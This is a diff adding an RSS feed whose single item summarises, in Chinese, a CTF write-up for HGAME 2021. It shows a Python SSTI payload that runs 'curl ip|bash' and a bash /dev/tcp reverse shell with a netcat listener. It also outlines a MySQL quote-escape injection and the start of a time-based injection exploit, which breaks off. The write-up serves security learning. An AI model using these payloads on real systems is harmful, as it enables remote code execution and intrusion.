@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>XSS on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/xss/</link>
+    <description>Recent content in XSS on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 20 Feb 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/xss/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HGAME 2021 Writeup</title>
+      <link>https://anthem-whisper.github.io/p/hgame-2021-writeup/</link>
+      <pubDate>Sat, 20 Feb 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/hgame-2021-writeup/</guid>
+      <description>Level - Week3 Forgetful 考点：简单python-SSTI
+题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：
+最为常规的payload：
+{{[].__class__.__mro__[1].__subclasses__()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()}}因为命令执行处有waf，所以可以选择直接弹shell：
+nc -lvnp 8888bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1姿势还是比较常规；
+分享一个从[].__class__.__mro__[1].__subclasses__()查找模块位置的脚本：
+#python 3 import re str = &amp;#39;&amp;#39;&amp;#39; [回显内容] &amp;#39;&amp;#39;&amp;#39; list = re.split(&amp;#39;,&amp;#39;, str) for i in range(0, len(list)): if &amp;#39;catch_warnings&amp;#39; in list[i]: print(i) break iki-Jail 考点：MySQL注入，单引号逃逸
+熟悉的登录框，熟悉的sql注入
+发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。
+于是直接使用bp对login.php发包；
+进行了简单的fuzz，过滤如下：
+由单双引号过滤想到了\逃逸单引号，当我们用户名输入admin\的时候，语句变成了：
+SELECT * FROM user WHERE username=&amp;#39;admin\&amp;#39; AND password=&amp;#39;xxx&amp;#39; 那么xxx就变成了sql语句执行，造成了注入；
+结果发现只能延时注入：
+exp：
+#python3,wh1sper import requests import time host = &amp;#39;https://jailbreak.</description>
+    </item>
+    
+  </channel>
+</rss>
